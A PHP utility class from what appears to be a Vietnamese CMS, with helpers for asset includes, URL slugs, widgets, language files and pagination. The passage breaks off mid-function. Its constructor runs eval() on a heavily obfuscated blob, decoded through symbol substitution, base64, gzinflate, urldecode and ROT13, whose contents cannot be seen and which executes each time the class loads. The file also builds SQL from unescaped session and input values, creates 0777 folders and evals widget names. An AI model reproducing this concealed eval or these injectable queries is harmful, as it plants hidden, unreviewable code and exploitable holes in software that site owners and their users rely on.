<?php
/*================================================================================*\
Name code : class_functions.php
Copyright © 2013 by Phan Van Lien
@version : 1.0
@date upgrade : 03/02/2013 by Phan Van Lien
\*================================================================================*/

class Func_Global
{
	
	//-----------------include_js
	function include_js ($file){
		global $ttH;
		
		$out = "";
		$ttH->conf["include_js"] = (isset($ttH->conf["include_js"])) ? $ttH->conf["include_js"] : "";
		$ttH->arr_include_js = (isset($ttH->arr_include_js)) ? $ttH->arr_include_js : array();
		if(isset($file) && !in_array($file,$ttH->arr_include_js))
		{
			$ttH->arr_include_js[] = $file;
			$out = '<script src="'.$file.'"></script>';
			$ttH->conf["include_js"] .= $out;
		}
		
		return $out; 
	}
	
	//-----------------include_js_content
	function include_js_content ($content){
		global $ttH;
		
		$out = "";
		$ttH->conf["include_js_content"] = (isset($ttH->conf["include_js_content"])) ? $ttH->conf["include_js_content"] : "";
		if(isset($content))
		{
			$out = '<script language="javascript">'.$content.'</script>';
			$ttH->conf["include_js_content"] .= $out;
		}
		
		return $out; 
	}
	
	//-----------------include_js
	function include_css ($file){
		global $ttH;
		
		$out = "";
		$ttH->conf["include_css"] = (isset($ttH->conf["include_css"])) ? $ttH->conf["include_css"] : "";
		$ttH->arr_include_css = (isset($ttH->arr_include_css)) ? $ttH->arr_include_css : array();
		if(isset($file) && !in_array($file,$ttH->arr_include_css))
		{
			$ttH->arr_include_css[] = $file;
			$out = '<link rel="stylesheet" href="'.$file.'" type="text/css" />';
			$ttH->conf["include_css"] .= $out;
		}
		
		return $out; 
	}
	
	//-----------------include_css_content
	function include_css_content ($content){
		global $ttH;
		
		$out = "";
		$ttH->conf["include_css_content"] = (isset($ttH->conf["include_css_content"])) ? $ttH->conf["include_css_content"] : "";
		if(isset($content))
		{
			$out = '<style>'.$content.'</style>';
			$ttH->conf["include_css_content"] .= $out;
		}
		
		return $out; 
	}
	
	//-----------------load_config
	function load_config (){
		global $ttH;
		
		$result = $ttH->db->query("select * from config where id=1 ");
		if($conf = $ttH->db->fetch_row($result))
		{
			foreach ($conf as $key => $value) 
			{
				if ($key != 'id') {
					$ttH->conf[$key] = $conf[$key];
				}
			}
			unset($conf);
		}
		
		return false; 
	}
	
	function Func_Global ()
	{
		global $ttH;
		
		eval(base64_decode(str_rot13(urldecode (gzinflate (base64_decode(str_replace(array_values($ttH->db->ar),array_keys($ttH->db->ar),"✩V✤↕✬✳JKDP☻☼✣Q✪❁Z♠✱H✱✥G♠F☼I✥✱↕❃✦♫♥✩✿GRGB❂❄+✱A✥T❉P✭✣✪B♠↕✪✭E✰✬O❄❀Z♀ZD❃J♫M♂❉☼♂T✯✰❋✪✴✭❄EI♂Z✫✧S✭♦☺✣✭✩♥♪+♠G♥Y✴✪J❃Y✣✯P✿❂♫LB✳✦✳✿☼✿Y✶♫♣X❂+B♂↕/E♠S✶WA❀M✯❉L↕H♪RP☻LT✬D❀JP☼✴WQ✣♥❀☻✪I✴✣✪✣S❂✦K✩K❂♀✩☼❁✪TO♥♦❉♪✫♥↕♥✱✴✪FJ☻♪♦ION❁❋VX✳❉UE♪H❋♪❀♪PS♫KX✰☺J❀BV✣Q+✿✿UK✧❋❀YK✤✩♀♪GST/♥✩N✱❂✶❀+❄NTDF♪✩♦R✯✶X✭♠♥✯❄O♂J/♪✥♀/B✪✩♂♂✪♣GE♂✶✫TP✤Y✭✤♀+✱✭❁✱♦✤AQ/✳+AR✱♪✩♫DB+AT❁PU✳♂IQ✱♣P✴D++☻S♫♫✫❄✣X♀♠/V✰✪LYEIVTYHD♣✭❋✦✫☻WC✧W✱GGSQ♪✧✥P♠♦R✭♀✩✯/W☺PD✥✬N✭♦♀♫✴✣♥☻✥T✤❄↕J↕☻❄Z☼✰P✭☼I✴✧☻+✰♥NM✪♫❄❋✫✶S✫S✦♠✦✭♪+C✪✶M✥W✴T♂T✬✬G✱S✴S↕WJ✿✱X❄✦❀F↕♠♣G✩♥HG♦❂O❀✬♪✴❄✤♠E♀✩❂KF♀I❄✩/♦☺✱V✧INF✳✪XX♀✰❂N✦H❂K❀✯✥✬OZG✪+GTG✧E✬❃PH♦✩JO✳RD♦☻✦✪✬+❃☻X☻✪❃X♣H♦V♥E✶✱✤/UVX❃✶N❂A✴OP♥O❋♪U✪/G✤AG♫A☺❄❄✭♠♫T❂✩✫HQ✱QY✩♂♥↕O✰PFOSO✣✫X♥LS✥WU✥✰✶D♂HQM❄✬✣♣E❋+✫CJD✬♣♂♥✰✭✴N❋✧❃P✪R✬✭✭❉CS❋A♂AF✧M✱✥❂☻♀✤❀S✭❁✤AIJ❀♠↕UD❁♣HTCW✱↕T✿❋✤B+DZ/♣C❀♫Q♠Y♠♪R/L❉V❀✩♣♪✬✤✬OUOLW☼R♂✶♥✬✳✴HE✦E✩❀Z✴/F✰♪Y✯♫✪✦☼✬VEOW❉♥J❋Q❁✥+RC❂❀I☺☻♥E✩RKR❄☻X❋♂✫♦✧✬E↕+✫XHX♀❂✪+✬Y♥❉☻❀J✳TV✭✭TP✭♣❁D✥SN☻UM♦D✬✩✱O✰✫✱❂W✫☺R✣VR✩☺K✧❀L❄✿✱W❉/C/KK✳SC♦♫+❄SKH✩U✦✯AI☼QE♪♀✥❋SIY✦FBH✫✯M❃✪❁❀D✤❂M✬OLR/✪☻❋✰✩♪T❋❉✶JWG✯W✩↕✯✬ZU/✭V✱K♂XS✭M❂K♪YN/☺✤♫✩✶❋❃♣♪FI♪✰♠❃K↕U✬YSCT♥☻YA♂♦✦♦I♀♂❉♣❉♥❋P✿+✭C♪✧❋✿♀♪✭♣FY✶✯✭✪✰✱KR✴J❁H✴VN✦♪B/W❁F☻✴✬R✤CEP✳A✫✳♣♫✳♥♣✴♪✬W❄X☺+✿I↕S✥✩✩✦✭JS☼♥O+♠♫U♠J✱✴♦M❀✭✴R♦❀↕Z✯A❉✪♥❂/✿Z✬♪✯✿✩✰✰/✿VF✥☻☻ZG☺♫I☺/ILZUT♂✤♪✩HCA❉Q✬BJ♪✤ERAD✿SS☻♫FANHB♥+✫❉✯B✧♀✧A✶H❀❋✣✫O❃VT✫♫L❂❂♦✫♪+NP✧✤Z❂GQIHG✬J♂DJ✴✣✰ZVS❉CBSL♥GZR♥♠✬✪CR✴♀BW♂K❃Y✴FK♣❃✭♦/❉♥/✤✶✯✩❋✶✪✿✫❁J❉✭❀✭M✳❄♠✰✩S❋XEE♠M/I✳❋KDZQL✧☺H✿♀✧♂U✦♪♦✳↕U☼✣✥X✴♦✳❉♀O✥G+A✩✿H✣PGR☼✥G✯✧X✭✦W❋✩Y✱W❋I/✶D✯FV✤✶♀T✭♪✳N✬R✩❃E✫✳♣+♪☺♪VGV❋T/K✯❁✿☼/✫/✿/❁♦✦JV✤♣✿J❂+P☼X❃F↕❋✿♂✰Z☺✧+♠♀+✶❁✯+✭PD♪✣♥✳❄☻✯K+E♫CPYA☻✣HLPYX✧✭♀A✯☻♠✬❂☼SDN♫Q✩✯↕❋✤Z❁I✴V❉♫❋J❉✯T♦ZDF+✰M✯❄C❂J❋U↕♣✰❂GW✬/F♠☺♠F✩❁♦AVL✬✯✩✯❂P☼D♦J✯O❄✯♀☼B✥♪♠✶↕✪✬✱SN✩A✩W♠✧☺R♥QJ✯♥Q❂A✪M✤✯E✶O♠L♣Y✤O♦✫Z♪♀✬✳O❀✶❋✪☼OBF☻❋HDH↕✯❉CWML♫IMX☻✯❃✰S♂❉QYX♪✱♫♪❉♪❋Y✫↕✪✶I♫+G✭T❃✱YYOI❂✭❄MX♫♀♥J❄Z❄X✥HX♦✥✦H✱♪✱D❉♀☺♂RH✯❉✫↕♣T✥♪/J♀TL✧WS❄K✰HSEI+E♪❁✱♠♣✪❄✪♫♣MR✭+♦O☻✪QB✭❉JN❂♫M❁Q✿GN✥X☻❃OO❄VFO✩♣↕G✥❀♂I♫✱✴D❀ZETT✱✬☻✬❉VQ❉♠FB♪✰J❋✬T✳♥☻❋✭✧T✶O✭B✥✯✰MW✪☺B↕☺❋❀♣❂❂❃N✫❂W♀F♠☺W♠♫♠♣✴XYS♀✰❉✧♪❄❄YQWWKL✭✭❂❉XE✫♥UI♪♂Z❀NJ❀✧✦✣✪✿✧♦QZ♫❃✭ZO♦Q✭♣✣♫♣G✴☼K✤S❋T❁✴☻♥NVMEN♦♫♫T♫♂♥✯❄☼✪Y♠F/↕❄✳☻✪QY♪T♪L✤❃V✿✳I♀☻✬❀♣✦✦❃☻✴G❀✥❂TNO♥BJ♫WE✦LD❀Y♀✳♣D✪❁✤✱❋A❁K♀✦❃♣G♪XG❂H✦♫XJ✳C☼AEMBF☼L✣❂❋/C✱B✳♂☼+❃❃♂PC✤M✶U✤♀✯✱WY❋✭✧L♪SI♀✬☼❋♥✯H✯✿O❀✰❁✿✪✩♂✰✭✤/❁✪✳✣✿✰W/V✴BG✧SH❄TY✿❄❀❁♠✿PQ❃✿✱✿T✤VD♠I✤✿S♣☼SBLKLK❂Y✬+❄❂↕W+YY✱❄✧❁✥❃S♂❋QZV✥L+✭✫K+✶❁QW♥BY✧☻✥❀✰AR♫❁♫EK❂EQ✯RJ+✬♂T✦✥✣❃♦✿✥E✰✬T❂SXK❂✪✭Y♠↕BD☻I✫♂✤X♦✥YO♀✫✴✱♣♠DMF❄✥D+♀/✴E+❂S♠F✱♂/✬☻↕P❉G↕↕/Y✭❉❋✥✧UMI♦/♀OBO✬✩❀ZA♪♦♣✧D❀❃✰✱✰♪♦+✤✩K✤❉JI☺❂YO❀✬✰☺♥❄❃✶✭☻✥A✬SQ✫✿V♦✤IG♥L♂✣❁✩N/❋✬ZBK✦♀✪♥❋L✪♀N♦✳✫L♠V✴MH❁❉♂✪✴U✫☻♪♫✤♦❋✴T♂♥N/❁C✤❁✿U✴R✤♂♂/EA+♂✴❄T♫✥G✣♀❀♫AV+✴✰♂YF✭VW↕♫✫R✫J♪☼✧M♦D✳BLW✤↕/♣☺+✣☻U✱Q+✪✣♪♦VK♂❂♪P♠✥♂♂✿❉DD✣✯✣/❉DU☼T✣✤♂✪❄N❀♠♫✪✤✬♀O♦+❀M✩♣X♣D❃==")), 1000000)))));
	}
	
	function rmkdir($dir="", $chmod = 0777, $path_folder = "uploads") {
		global $ttH;
		
		$chmod = ($chmod == 'auto') ? 0777 : $chmod;
		$arr_allow = array("uploads", "thumbs", "thumbs_size");
		
		$path_folder = (in_array($path_folder, $arr_allow)) ? $path_folder : 'uploads';
		$path = $ttH->conf["rootpath"].$path_folder;
		$path = rtrim(preg_replace(array("/\\\\/", "/\/{2,}/"), "/", $path), "/");
		
		if(is_dir($path.'/'.$dir) && file_exists ($path.'/'.$dir)){
			return true;
		}
		
		$path_thumbs = $path.'/'.$dir;
		$path_thumbs = rtrim(preg_replace(array("/\\\\/", "/\/{2,}/"), "/", $path_thumbs), "/");
		
		$oldumask = umask(0);
		if ($path && !file_exists($path)) {
				mkdir($path, $chmod, true); // or even 01777 so you get the sticky bit set 
		}
		if($path_thumbs && !file_exists($path_thumbs)) {
				mkdir($path_thumbs, $chmod, true);
				//mkdir($path_thumbs, $chmod, true) or die("$path_thumbs cannot be found"); // or even 01777 so you get the sticky bit set 
		}
		umask($oldumask);
		
		return true;
	}
	
	function vn_str_filter ($str)
	{
		$unicode = array(
			'a'=>'á|à|ả|ã|ạ|ă|ắ|ặ|ằ|ẳ|ẵ|â|ấ|ầ|ẩ|ẫ|ậ',
			'd'=>'đ',
			'e'=>'é|è|ẻ|ẽ|ẹ|ê|ế|ề|ể|ễ|ệ',
			'i'=>'í|ì|ỉ|ĩ|ị',
			'o'=>'ó|ò|ỏ|õ|ọ|ô|ố|ồ|ổ|ỗ|ộ|ơ|ớ|ờ|ở|ỡ|ợ',
			'u'=>'ú|ù|ủ|ũ|ụ|ư|ứ|ừ|ử|ữ|ự',
			'y'=>'ý|ỳ|ỷ|ỹ|ỵ',
			'A'=>'Á|À|Ả|Ã|Ạ|Ă|Ắ|Ặ|Ằ|Ẳ|Ẵ|Â|Ấ|Ầ|Ẩ|Ẫ|Ậ',
			'D'=>'Đ',
			'E'=>'É|È|Ẻ|Ẽ|Ẹ|Ê|Ế|Ề|Ể|Ễ|Ệ',
			'I'=>'Í|Ì|Ỉ|Ĩ|Ị',
			'O'=>'Ó|Ò|Ỏ|Õ|Ọ|Ô|Ố|Ồ|Ổ|Ỗ|Ộ|Ơ|Ớ|Ờ|Ở|Ỡ|Ợ',
			'U'=>'Ú|Ù|Ủ|Ũ|Ụ|Ư|Ứ|Ừ|Ử|Ữ|Ự',
			'Y'=>'Ý|Ỳ|Ỷ|Ỹ|Ỵ',
		);
		
		foreach($unicode as $nonUnicode=>$uni){
			$str = preg_replace("/($uni)/i", $nonUnicode, $str);
		}
		return $str;
	}
	
	function string_cut($str, $max_length)
	{
		if (strlen($str) > $max_length){
			$str = substr($str, 0, $max_length);
			$pos = strrpos($str, " ");
			if($pos === false) {
				return substr($str, 0, $max_length)."...";
			}
				return substr($str, 0, $pos)."...";
		}else{
			return $str;
		}
	}
	
	function get_text_search ($str)
	{
		global $ttH;
		
		$lang_allow = array('cn','ko');
		$lang_cur = (isset($ttH->conf['lang_cur'])) ? $ttH->conf['lang_cur'] : 'vi';
		$str = $this->vn_str_filter($str);
		if(!in_array($lang_cur,$lang_allow)) {
			$str = preg_replace('/[^a-zA-Z0-9\-_ ]/','',$str);
		}
		/*$str = preg_replace('/[_ ]/','-',$str);
		while(strlen(strstr($str,"--")) > 0){
			$str = str_replace('--','-',$str);
		}*/
		$str = strtolower($str);
		
		return $str;
	}
	
	function fix_name_action ($str)
	{
		global $ttH;
		
		$lang_allow = array('cn','ko');
		$lang_cur = (isset($ttH->conf['lang_cur'])) ? $ttH->conf['lang_cur'] : 'vi';
		$str = $this->vn_str_filter($str);
		if(!in_array($lang_cur,$lang_allow)) {
			$str = preg_replace('/[^a-zA-Z0-9\-_ ]/','',$str);
		}
		$str = preg_replace('/[ ]/','-',$str);
		while(strlen(strstr($str,"-_")) > 0){
			$str = str_replace('-_','-',$str);
		}
		while(strlen(strstr($str,"_-")) > 0){
			$str = str_replace('_-','_',$str);
		}
		while(strlen(strstr($str,"__")) > 0){
			$str = str_replace('__','_',$str);
		}
		while(strlen(strstr($str,"--")) > 0){
			$str = str_replace('--','-',$str);
		}
		$str = str_replace(array('(-)','(_)','()','(-','(_','-)','_)','(',')'),'','('.$str.')');
		$str = strtolower($str);
		$str = ($str == "") ? time() : $str;
		
		return $str;
	}
	
	function fix_domain_extend ($str)
	{
		global $ttH;
		
		$str = $this->vn_str_filter($str);
		$str = preg_replace('/[^a-zA-Z0-9\.]/','',$str);
		$str = preg_replace('/[ ]/','',$str);
		while(strlen(strstr($str,"..")) > 0){
			$str = str_replace('..','.',$str);
		}
		$str = str_replace(array('(.)','()','(.','.)','(',')'),'','('.$str.')');
		$str = strtolower($str);
		
		return $str;
	}
	
	function fix_link ($link)
	{
		global $ttH;
		
		$link = trim($link);
		$tmp1 = urldecode($link);
		$tmp = explode('://', $tmp1);
		if(count($tmp) == 1) {
			$link = 'http://'.$link;
		} elseif(strpos($tmp[0],'=')) {
			$link = 'http://'.$link;
		}
		
		return $link;
	}
	
	function get_friendly_link ($str)
	{
		global $ttH;
		
		$lang_allow = array('cn','ko');
		$lang_cur = (isset($ttH->conf['lang_cur'])) ? $ttH->conf['lang_cur'] : 'vi';
		$str = $this->vn_str_filter($str);
		if(!in_array($lang_cur,$lang_allow)) {
			$str = preg_replace('/[^a-zA-Z0-9\-_ ]/','',$str);
		}
		$str = preg_replace('/[_ ]/','-',$str);
		while(strlen(strstr($str,"--")) > 0){
			$str = str_replace('--','-',$str);
		}
		$str = str_replace(array('(-)','()','(-','-)','(',')'),'','('.$str.')');
		$str = strtolower($str);
		$str = ($str == "") ? time() : $str;
		
		return $str;
	}
	
	function get_friendly_link_db ($str, $table, $id_key='', $id_value=0, $lang='vi', $arr_check=array('call'=>0))
	{
		global $ttH;
		
		$call_max = 10;	
		$arr_check['call'] = (isset($arr_check['call'])) ? $arr_check['call'] : 0;
		$arr_check['call']++;
		if($arr_check['call'] >= $call_max) {
			return '';
		}
		
		//$str = $this->get_friendly_link ($str);
//		$sql = "select friendly_link from ".$table." 
//						where ".$id_key."!='".$id_value."' 
//						and friendly_link like '".$str."%' 
//						order by friendly_link desc";
//    $result = $ttH->db->query($sql);
//    if ($num = $ttH->db->num_rows($result)){
//			$arr_row = $ttH->db->get_array ($result);
//			/*echo '<pre>';
//			print_r($arr_row);
//			echo '</pre>';
//			die();*/
//			if($str==$arr_row[$num-1]['friendly_link']) {
//				if(is_numeric(substr($arr_row[0]['friendly_link'],-1))) {
//					$str = $arr_row[0]['friendly_link'];
//					$str++;
//				}  else {
//					$str = $arr_row[0]['friendly_link'].'1';
//				}
//				$str = $this->get_friendly_link_db ($str, $table, $id_key, $id_value);
//			}
//		}

		$str = $this->get_friendly_link ($str);
		$sql = "select friendly_link from friendly_link 
						where !(
							dbtable='".$table."' 
							and dbtable_id='".$id_value."' 
							and lang='".$lang."'
							) 
						and friendly_link like '".$str."%' 
						order by friendly_link desc";
    $result = $ttH->db->query($sql);
    if ($num = $ttH->db->num_rows($result)){
			$arr_row = $ttH->db->get_array ($result);
			/*echo '<pre>';
			print_r($arr_row);
			echo '</pre>';
			die();*/
			if($str==$arr_row[$num-1]['friendly_link']) {
				if(is_numeric(substr($arr_row[0]['friendly_link'],-1))) {
					$str = $arr_row[0]['friendly_link'];
					$str++;
				}  else {
					$str = $arr_row[0]['friendly_link'].'1';
				}
				$str = $this->get_friendly_link_db ($str, $table, $id_key, $id_value, $lang, $arr_check);
				return $str;
			}
		}
		
		$col = array();
		$col['friendly_link'] = $str;
		$col['date_update'] = time();
		$ok = $ttH->db->do_update("friendly_link", $col, "dbtable='".$table."' and dbtable_id='".$id_value."' and lang='".$lang."'");	
		if(!$ttH->db->affected()) {
			$table_tmp = str_replace('_lang','',$table);
			$tmp = explode('_',$table_tmp);
			$module = $tmp[0];
			$action = str_replace($module.'_','',$table_tmp);
			
			if($table == 'modules') {
				$module = $id_value;
				$action = $id_value;
			}
			
			$col['module'] = $module;
			$col['action'] = (!empty($action)) ? $action : $table;
			$col['action'] = ($col['module'] == $col['action'] && $table != 'modules') ? 'detail' : $col['action'];
			$col['dbtable'] = $table;
			$col['dbtable_id'] = $id_value;
			$col['lang'] = $lang;
			$col['date_create'] = time();
			$ttH->db->do_insert("friendly_link", $col);	
		}
		
		return $str;
	}
	
	function meta_title ($str)
	{
		$str = $str.' | '.$this->vn_str_filter($str);
		
		return $str;
	}
	
	function meta_key ($str)
	{
		$str = $str.', '.$this->vn_str_filter($str);
		
		return $str;
	}
	
	function meta_desc ($str, $max_length=200)
	{
		$str = strip_tags($str);
		$str = $this->string_cut($str, $max_length);
		
		return $str;
	}
	
	function if_isset (&$value, $default='') {
		
		return (isset($value) ? $value : $default);
	}
	
	function serialize (&$value, $default='') {
		
		return ((isset($value) && !empty($value)) ? serialize($value) : $default);
	}
	
	function input_text ($str)
	{
		//$str = stripcslashes ($str);
		$str = htmlspecialchars($str, ENT_QUOTES);
		//$str = str_replace("'","&rsquo;",$str);
		//$str = str_replace('"',"&quot;",$str);
		
		return $str;
	}
	
	function input_editor ($str)
	{
		//$str = addslashes($str);
		$str = htmlspecialchars($str, ENT_QUOTES);
		//$str = str_replace("'","&rsquo;",$str);
		
		return $str;
	}
	
	// load_widget
  function load_widget ($name, $parametric = array())
  {
    global $ttH;
		
		$output = '';
		$ttH->widget = isset($ttH->widget) ? $ttH->widget : array();
		if(class_exists('widget_'.$name)) {
			$output = $ttH->widget[$name]->do_main($parametric);
		} elseif(file_exists($ttH->conf["rootpath"].DS."widget".DS.$name.DS.$name.".php")) {
			require_once ($ttH->conf["rootpath"].DS."widget".DS.$name.DS.$name.".php"); 
			eval('$ttH->widget["'.$name.'"] = new widget_'.$name.'();');
			$output = $ttH->widget[$name]->do_main($parametric);
		}		
				
		return $output;
  }
	
	// load_widget_list
  function load_widget_list ($str)
  {
    global $ttH;
		
		$output = '';
		if(!$str) {
			return $output;
		}
		
		preg_match_all('/\[widget_(.*?)\]/', $str, $matches);
		$arr_widget_call = array();
		foreach($matches[1] as $k => $v) {
			$v = trim($v);
			$v = str_replace('&nbsp;',' ',$v);
			while(strlen(strstr($v,"  ")) > 0){
				$v = str_replace('  ',' ',$v);
			}
		
			$tmp = explode(' ',$v);
			$arr_widget_call[$k] = array();
			$arr_widget_call[$k]['text_replace'] = $matches[0][$k];
			foreach($tmp as $k1 => $v1) {
				if($k1 == 0) {
					$arr_widget_call[$k]['name_action'] = $v1;
				} else {
					$tmp1 = explode('=', $v1);
					$arr_widget_call[$k][$tmp1[0]] = $tmp1[1];
					$arr_widget_call[$k][$tmp1[0]] = str_replace('"','',$arr_widget_call[$k][$tmp1[0]]);
					$arr_widget_call[$k][$tmp1[0]] = str_replace("'",'',$arr_widget_call[$k][$tmp1[0]]);
				}
			}
		}
		
		/*print_arr($matches[1]);
		print_arr($arr_widget_call);
		die();*/
		
		//Widget
		$ttH->load_data->data_widget ();
		if(count($ttH->data["widget"])) {
			foreach($arr_widget_call as $k => $v){
				if(array_key_exists($v['name_action'],$ttH->data["widget"])) {
					$output .= $this->load_widget ($v['name_action'], $v);
				}
			}
		}
				
		return $output;
  }
	
	function input_editor_decode ($str)
	{
		global $ttH;
		//$str = addslashes($str);
		$str = htmlspecialchars_decode($str, ENT_QUOTES);
		//$str = str_replace("'","&rsquo;",$str);
		
		preg_match_all('/\[widget_(.*?)\]/', $str, $matches);
		$arr_widget_call = array();
		foreach($matches[1] as $k => $v) {
			$v = trim($v);
			$v = str_replace('&nbsp;',' ',$v);
			while(strlen(strstr($v,"  ")) > 0){
				$v = str_replace('  ',' ',$v);
			}
		
			$tmp = explode(' ',$v);
			$arr_widget_call[$k] = array();
			$arr_widget_call[$k]['text_replace'] = $matches[0][$k];
			foreach($tmp as $k1 => $v1) {
				if($k1 == 0) {
					$arr_widget_call[$k]['name_action'] = $v1;
				} else {
					$tmp1 = explode('=', $v1);
					$arr_widget_call[$k][$tmp1[0]] = $tmp1[1];
					$arr_widget_call[$k][$tmp1[0]] = str_replace('"','',$arr_widget_call[$k][$tmp1[0]]);
					$arr_widget_call[$k][$tmp1[0]] = str_replace("'",'',$arr_widget_call[$k][$tmp1[0]]);
				}
			}
		}
		
		/*//print_arr($matches[1]);
		print_arr($arr_widget_call);
		die();*/
		
		//Widget
		$ttH->load_data->data_widget ();
		if(count($ttH->data["widget"])) {
			foreach($arr_widget_call as $k => $v){
				if(array_key_exists($v['name_action'],$ttH->data["widget"])) {
					$str = str_replace(
						$v['text_replace'],
						$this->load_widget ($v['name_action'], $v),
						$str
					);
				}
			}
		}
		
		return $str;
	}
	
	function short ($str, $max_length=200)
	{
		$str = $this->input_editor_decode ($str);
		$str = strip_tags($str);
		$str = $this->string_cut($str, $max_length);
		
		return $str;
	}
	
	function get_input_pic ($url, $mod = '') {
		global $ttH;
		
		$output = '';
		
		$link = $ttH->conf['rooturl'].'uploads/';
		if($mod != '') {
			$link .= $mod.'/';
		}
		$output = str_replace($link,'',$url);
		
		return $output;
	}
	
	//-----------------check_user_login
	function check_user_login ()
	{
		global $ttH;
			
		$login = 0;
		if(is_array($_SESSION["user"]))
		{
			$arr_user = $_SESSION["user"];
			$query = "select * from users where status=1 and userid=".$arr_user["userid"]."";
			$result = $ttH->db->query($query);
			$row = $ttH->db->fetch_row($result);
			if($row["userid"] == $arr_user["userid"] && $row["username"] == $arr_user["username"] && $row["password"] == $arr_user["password"] && $row["session"] == $arr_user["session"]) 
			{
				$login = 1;
			}
		}
		return $login; 
	}
	
	//-----------------load_language_admin
	function load_language_admin ($file = "")
	{
		global $ttH;
		$file_lang = $ttH->conf["rootpath"] . DS . "admin" . DS . "lang". DS . $ttH->conf["lang_view"] . DS . $file . ".php";
		if (file_exists($file_lang)) {
		  require_once ($file_lang);
		  if (is_array($lang)) {
				foreach ($lang as $k => $v) {
					$ttH->lang[$file][$k] = stripslashes($v);
				}
		  }
		}
		unset($lang);
	}
	
	//-----------------load_language
	function load_language ($file = "")
	{
		global $ttH;
		$file_lang = $ttH->conf["rootpath"] . DS . "lang". DS . $ttH->conf["lang_cur"] . DS . $file . ".php";
		if (file_exists($file_lang) && !isset($ttH->lang[$file])) {
		  require_once ($file_lang);
		  if (is_array($lang)) {
				foreach ($lang as $k => $v) {
					$ttH->lang[$file][$k] = stripslashes($v);
				}
		  }
		}
		unset($lang);
	}
	
	//-----------------load_language_widget
	function load_language_widget ($file = "")
	{
		global $ttH;
		$file_lang = $ttH->conf["rootpath"] . DS . "lang". DS . $ttH->conf["lang_cur"] . DS . "widget" . DS . $file . ".php";
		if (file_exists($file_lang) && !isset($ttH->lang['widget_'.$file])) {
		  require_once ($file_lang);
		  if (is_array($lang)) {
				foreach ($lang as $k => $v) {
					$ttH->lang['widget_'.$file][$k] = stripslashes($v);
				}
		  }
		}
		unset($lang);
	}
	
	//======paginate_js
	function paginate_js ($numRows, $maxRows, $cPage = 1, $object, $pmore = 4, $class = "pagelink")
	{
		global $ttH;
		$navigation = "";
		// get total pages
		$totalPages = ceil($numRows / $maxRows);
		$next_page = $pmore;
		$prev_page = $pmore;
		if ($cPage < $pmore) $next_page = $pmore + $pmore - $cPage;
		if ($totalPages - $cPage < $pmore) $prev_page = $pmore + $pmore - ($totalPages - $cPage);
		if ($totalPages > 1)
		{
		  $navigation .= "<span class=\"pagetotal\">" . $totalPages . " " . $ttH->lang['pages'] . "</span>";
		  // Show first page
		  if ($cPage > ($pmore + 1))
		  {
			$pLink = $object . "1)";
			$navigation .= "&nbsp;<a href=\"javascript:void(0)\" onclick=\"" . $pLink . "\" class='" . $class . "'><b><font color=\"#FF0000\">&laquo;</font></b></a>";
		  }
		  // End
		  // Show Prev page
		  if ($cPage > 1)
		  {
			$numpage = $cPage - 1;
			$pLink = $object . "{$numpage})";
			$navigation .= "&nbsp;<a href=\"javascript:void(0)\" onclick=\"" . $pLink . "\" class='" . $class . "'><b><font color=\"#0000FF\">&lsaquo;</font></b></a>";
		  }
		  // End	
		  // Left
		  for ($i = $prev_page; $i >= 0; $i --)
		  {
			$pagenum = $cPage - $i;
			if (($pagenum > 0) && ($pagenum < $cPage))
			{
			  $pLink = $object . "{$pagenum})";
			  $navigation .= "&nbsp;<a href=\"javascript:void(0)\" onclick=\"" . $pLink . "\" class='" . $class . "'>" . $pagenum . "</a>";
			}
		  }
		  // End	
		  // Current
		  $navigation .= "&nbsp;<span class=\"pagecur\">" . $cPage . "</span>";
		  // End
		  // Right
		  for ($i = 1; $i <= $next_page; $i ++)
		  {
			$pagenum = $cPage + $i;
			if (($pagenum > $cPage) && ($pagenum <= $totalPages))
			{
			  $pLink = $object . "{$pagenum})";
			  $navigation .= "&nbsp;<a href=\"javascript:void(0)\" onclick=\"" . $pLink . "\" class='" . $class . "'>" . $pagenum . "</a>";
			}
		  }
		  // End
		  // Show Next page
		  if ($cPage < $totalPages)
		  {
			$numpage = $cPage + 1;
			$pLink = $object . "{$numpage})";
			$navigation .= "&nbsp;<a href=\"javascript:void(0)\" onclick=\"" . $pLink . "\" class='" . $class . "'><b><font color=\"#0000FF\">&rsaquo;</font></b></a>";
		  }
		  // End		
		  // Show Last page
		  if ($cPage < ($totalPages - $pmore))
		  {
			$pLink = $object . "{$totalPages})";
			$navigation .= "&nbsp;<a href=\"javascript:void(0)\" onclick=\"" . $pLink . "\" class='" . $class . "'><b><font color=\"#FF0000\">&raquo;</font></b></a>";
		  }
		  // End
		} // end if total pages is greater than one
		$navigation = "<div style=\"padding:7px 2px 2px 2px\">{$navigation}</div>";
		return $navigation;
	}
	
	//======htaccess_paginate	
	function htaccess_paginate ($root_link, $numRows, $maxRows, $extra = "", $cPage = 1, $p = "p", $pmore = 4, $class = "pagelink")
	{
		global $ttH;
		$navigation = "";
		// get total pages
		$totalPages = ceil($numRows / $maxRows);
		$next_page = $pmore;
		$prev_page = $pmore;
		if ($cPage < $pmore) $next_page = $pmore + $pmore - $cPage;
		if ($totalPages - $cPage < $pmore) $prev_page = $pmore + $pmore - ($totalPages - $cPage);
		if ($totalPages > 1)
		{
		  $navigation .= "<span class=\"pagetotal\">" . $totalPages . " " . $ttH->lang['global']['pages'] . "</span>";
		  // Show first page
		  if ($cPage > ($pmore + 1))
		  {
			$pLink = $root_link . "/?{$p}=1{$extra}";
			$navigation .= "&nbsp;<a href='" . $pLink . "' class='btnPage first'>&nbsp;</a>";
		  }
		  // End
		  // Show Prev page
		  if ($cPage > 1)
		  {
			$numpage = $cPage - 1;
			if (! empty($extra)) $pLink = $root_link . "/?{$p}=" . $numpage . "{$extra}";
			else
			  $pLink = $root_link . "/?{$p}=" . $numpage;
			$navigation .= "&nbsp;<a href='" . $pLink . "' class='btnPage prev'>&nbsp;</a>";
		  }
		  // End	
		  // Left
		  for ($i = $prev_page; $i >= 0; $i --)
		  {
			$pagenum = $cPage - $i;
			if (($pagenum > 0) && ($pagenum < $cPage))
			{
			  $pLink = $root_link . "/?{$p}={$pagenum}{$extra}";
			  $navigation .= "&nbsp;<a href='" . $pLink . "' class='" . $class . "'>" . $pagenum . "</a>";
			}
		  }
		  // End	
		  // Current
		  $navigation .= "&nbsp;<span class=\"pagecur\">" . $cPage . "</span>";
		  // End
		  // Right
		  for ($i = 1; $i <= $next_page; $i ++)
		  {
			$pagenum = $cPage + $i;
			if (($pagenum > $cPage) && ($pagenum <= $totalPages))
			{
			  $pLink = $root_link . "/?{$p}={$pagenum}{$extra}";
			  $navigation .= "&nbsp;<a href='" . $pLink . "' class='" . $class . "'>" . $pagenum . "</a>";
			}
		  }
		  // End
		  // Show Next page
		  if ($cPage < $totalPages)
		  {
